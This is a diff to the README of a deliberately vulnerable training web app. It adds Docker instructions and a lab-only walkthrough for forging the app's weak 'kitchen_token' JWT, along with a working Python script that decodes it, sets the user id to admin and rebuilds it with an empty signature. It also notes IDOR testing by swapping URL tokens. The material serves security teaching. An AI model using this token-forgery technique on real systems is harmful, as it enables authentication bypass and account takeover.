@@ -44,9 +44,64 @@ python3 setup.py # Initializes the database with the Borgor Science schema
 python3 vuln_app.py
 ```
 
+### Using the Dockerfile
+```bash
+docker build -t borgor-vuln .
+docker run --rm --name borgor-vuln -p 5000:5000 borgor-vuln
+```
+- App URL: `http://127.0.0.1:5000`
+- The image initializes `app.db` during build (`RUN python setup.py` in `Dockerfile`).
+- To refresh seeded data in a container workflow, rebuild the image:
+```bash
+docker build --no-cache -t borgor-vuln .
+```
+
 ### Create Test Accounts
 - Register at `/register` to create a user with a personalized burger profile.
 - Use `/view-burger-profile` while logged in to see your own profile first, then replace the `token` in the URL to validate IDOR behavior.
+
+### JWT Exploit Walkthrough (Lab Only)
+The app uses a weak cookie token named `kitchen_token`:
+- Header includes `alg: none` (no signature verification).
+- Payload is only obfuscated with reversible character shifting + base64url.
+- There is no secret key to crack, so HMAC brute-force tools are unnecessary for this JWT weakness.
+
+Exploit steps:
+1. Login or register as any user.
+2. Capture your `kitchen_token` cookie from browser devtools or an intercepting proxy.
+3. Decode and de-obfuscate payload, change `"id"` to `"admin"`, and set `"exp"` to a future timestamp.
+4. Re-obfuscate and re-encode payload, then rebuild token as `header.payload.` (empty signature).
+5. Replace the `kitchen_token` cookie with the forged token and browse to `/kitchen-secrets`.
+
+Example token forger:
+```bash
+python3 - <<'PY'
+import base64
+import json
+import time
+
+token = "PASTE_KITCHEN_TOKEN_HERE"
+header_seg, payload_seg, _ = token.split(".")
+
+def weak_shift(value, shift):
+    return ''.join(chr((ord(char) + shift) % 256) for char in value)
+
+def b64url_decode(segment):
+    segment += "=" * (-len(segment) % 4)
+    return base64.urlsafe_b64decode(segment).decode("latin1")
+
+def b64url_encode(value):
+    return base64.urlsafe_b64encode(value.encode("latin1")).decode().rstrip("=")
+
+payload = json.loads(weak_shift(b64url_decode(payload_seg), -4))
+payload["id"] = "admin"
+payload["exp"] = int(time.time()) + 3600
+
+new_payload_seg = b64url_encode(weak_shift(json.dumps(payload, separators=(",", ":")), 4))
+forged = f"{header_seg}.{new_payload_seg}."
+print(forged)
+PY
+```
 
 ### Testing CVE-2025-50817
 A dedicated Proof of Concept script is provided:
